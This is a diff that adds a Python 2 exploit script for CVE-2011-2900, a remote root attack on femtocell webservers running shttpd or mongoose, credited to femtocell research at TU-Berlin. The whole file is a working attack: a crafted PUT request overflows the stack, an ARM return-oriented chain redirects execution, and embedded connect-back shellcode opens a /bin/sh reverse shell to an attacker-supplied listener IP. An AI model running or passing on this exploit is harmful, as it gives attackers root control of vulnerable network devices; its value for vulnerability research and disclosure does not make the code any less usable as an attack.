@@ -1,0 +1,100 @@
+#!/usr/bin/env python
+# part of femtocell research by TU-Berlin
+# only for educational purposes
+# Exploit Title: remote root on sfr/ubiquisys femtocell webserver (wsal/shttpd/mongoose)
+# Date: 2011-08-02
+# Author: nion
+# Software: http://code.google.com/p/mongoose/ http://sourceforge.net/projects/shttpd/
+# Version: shttpd <= 1.42, mongoose <= 3.0
+# CVE: CVE-2011-2900
+# Tested on: Linux (proprietary embedded distro) Linux 2.6.18-ubi-sys-V2.0.17
+
+import socket, sys, time
+import urllib, struct
+
+if(len(sys.argv) < 3):
+	print sys.argv[0] + " <target ip> <listening ip>"
+	sys.exit(-1)
+
+target   = sys.argv[1]
+listener = sys.argv[2]
+
+SHELLCODE  = 0xbc568        # shellcode backup in connect struct, heap is not randomized
+STACK_LIFT = "%a0%ce%31%40" # didnt want to use urllib to encode at this point
+                            # because it moves the heap address depending on if character is printable or not
+							# and i was too lazy to adjust the payload when cleaning up the exploit :)
+
+buf = "PUT /"
+buf += "A" * 107 # first fill bytes will not be 148 because stack layout looks different when leaving put_dir()
+buf += STACK_LIFT
+
+# repeated stack lifting
+for i in xrange(0, 26):
+	buf += "A" * 148
+	buf += STACK_LIFT
+
+buf += "B"*132    # padding to overwrite pc, last jump will go over this one
+buf += STACK_LIFT # this will hit pc and produce our first jump
+                  # add sp, sp, #132; pop {r4, r5, r6, r7, pc}
+
+buf += "A"*12     # this will be our last stack lifting after
+buf += STACK_LIFT # jumping through our buffer back up
+
+# lets finish the path chunk and make some padding for the
+# last stack lift before pc gets popped to a different place
+buf+="AAAAAAAAA/"+"A"*138
+
+
+# first jump
+buf += urllib.quote(struct.pack("<L", 0x4032a410))
+# --,
+#   v
+# prepare lr so we can properly return from __clear_cache
+# 0x4032a410 <makecontext+28>:  pop {lr}        ; (ldr lr, [sp], #4)
+# 0x4032a414 <makecontext+32>:  add sp, sp, #8  ; 0x8
+# 0x4032a418 <makecontext+36>:  bx  lr
+buf+=urllib.quote(struct.pack("<L", 0x403e937c)) # free_slotinfo+128, return from __clear_cache
+buf+="DDDDDDDD" # skip sp lifting, 8 dummy bytes because sp is lifted before branching
+
+# --, bx lr
+#   v
+# 0x403e937c <free_slotinfo+128>:   pop {r4, pc}
+buf+="CCCC" # dummy r4
+buf+=urllib.quote(struct.pack("<L", 0x402e5064)) # __aeabi_cfcmple+16
+# --,
+#   v
+# 0x402e5064 <__aeabi_cfcmple+16>:   pop {r0, r1, r2, r3, pc}
+buf+="AAAA" # dummy r0
+buf+="CCCC" # dummy r1 (needed for __clear_cache)
+buf+="DDDD"*2 # dummy r2, r3
+buf+=urllib.quote(struct.pack("<L", 0x40364bbc)) # envz_merge+184
+# --,
+#   v
+# 0x40364bbc <envz_merge+184>:  mov r0, r11
+# 0x40364bc0 <envz_merge+188>:  pop {r4, r5, r6, r7, r8, r9, r11, pc}
+# at this point r11 points to an address on the heap in front of
+# our shellcode, e.g. 0xad220
+buf+="FFFF"*7 # dummy r4-r9+r11
+buf+=urllib.quote(struct.pack("<L", 0x402e5484)) # __clear_cache
+# --,
+#   v
+# __clear_cache will return to our prepare lr (free_slotinfo+128)
+# 0x403e937c <free_slotinfo+128>:   pop {r4, pc}
+buf+="AAAA" # dummy r4
+buf +=urllib.quote(struct.pack("<L", SHELLCODE)) # jump to shellcode
+
+# shellcode + some testing garbage in front of it
+buf += "A"*16 # some garbage padding in front of our payload, could be nops or whatever
+
+# make listener shellcode friendly
+evil_haxxor = urllib.quote("".join([struct.pack("B", int(x)) for x in listener.split('.')]))
+
+# connect back shellcode
+buf += "%01%10%8F%E2%11%FF%2F%E1%02%20%01%21%92%1A%0F%02%19%37%01%DF%06%1C%08%A1%10%22%02%37%01%DF%3F%27%02%21%30%1c%01%df%01%39%FB%D5%05%A0%92%1A%05%b4%69%46%0b%27%01%DF%C0%46%02%00%11%5c" + evil_haxxor + "%2f%62%69%6e%2f%73%68%00/ HTTP/1.0\r\n"
+
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((target, 80))
+s.send(buf)
+s.send("\r\n")
+print s.recv(1024)
